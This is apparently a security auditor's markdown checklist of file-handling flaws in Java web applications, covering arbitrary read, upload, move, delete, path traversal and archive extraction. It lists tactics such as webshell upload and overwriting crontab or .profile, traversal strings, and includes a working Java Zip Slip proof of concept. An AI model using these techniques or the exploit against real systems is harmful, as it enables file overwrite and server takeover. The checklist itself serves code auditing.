## Read
- Arbitrary file read
  - physical path
  - configure files
    - server
    - application
  - source codes
    - war/jar
    - zip/rar
  - other
    - db
    - key

## Upload
- Arbitrary file write/upload
  - webshell
  - replace javaagent.jar, jar in classpath
  - System file: related to [ATT&CK]()
    - crontab
    - .profile
  - key configure file
    - indirect control file content
- Cross directory: path splice user controlled file-name without checking or filter
  - contains(. / .. / %00 / ../ / ..\ /)
- Race Condition
  - file delete and can be access temporarily
- several processes
  - step1 upload and step2 modify
- DoS
  - path init: should be path but replace with a file
  - big size

## Import/
Trace the file parse logic,

## Delete
- Arbitrary
  - DoS
- 

## Move
  Guess the meaning of parameter in the request body, maybe a path name or other:
- overwrite important file to DoS
- move sensitive file and read
- upload file and move to web directory: jar/jsp


## Decompress
```
input = RequestPram(file);    # file = ../../../../tmp/poc.txt
File file = path + input; 
new ZipEntry(file);
```
Exploit
```
import java.io.File;
 import java.io.FileOutputStream;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipOutputStream;
 public class ZipExp { public static void main(String[] args) throws Exception { StringBuilder sb = new StringBuilder();
 sb.append("just a test");
 File f = new File("D:\\exp.zip");
 ZipOutputStream out = new ZipOutputStream(new FileOutputStream(f));
 ZipEntry e = new ZipEntry("../../../../../../../../../../../../../../../../../../../../tmp/pwn.txt");
 out.putNextEntry(e);
 byte[] data = sb.toString().getBytes();
 out.write(data, 0, data.length);
 out.closeEntry();
 out.close();
 } }
```

## Combine
- business logic
- sensitive function
  - execute script
  - 

## Function
### Archive
- ZipEntry.getName();
- request.getFileName.getOriginalFileName();


### xlsx
- XMLReader.setFeture
- 
